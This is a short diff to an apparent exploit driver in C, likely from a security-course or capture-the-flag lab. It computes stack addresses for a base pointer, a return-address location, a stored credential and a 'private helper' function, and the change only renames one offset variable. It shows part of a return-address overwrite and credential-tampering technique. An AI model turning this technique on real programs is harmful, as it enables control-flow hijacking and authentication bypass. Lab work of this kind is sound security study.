@@ -30,7 +30,7 @@ int main() {
     uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
     uint64_t cur_return_addr_loc = cur_main_bp + main_loop_return_addr_dist;
     uint64_t curr_auth_cred = cur_auth_bp - auth_bp_cred_dist;
-    uint64_t curr_private_helper_addr   = curr_main_loop_return_addr + private_helper_distance2;
+    uint64_t curr_private_helper_addr   = curr_main_loop_return_addr + private_helper2_distance;
 
     fprintf(stderr, "driver: Computed\ncur_auth_bp=%lx\ncur_return_addr_loc=%lx\ncur_auth_cred=%lx\ncurr_private_helper_addr=%lx\n", 
             cur_auth_bp, cur_return_addr_loc, curr_auth_cred, curr_private_helper_addr);
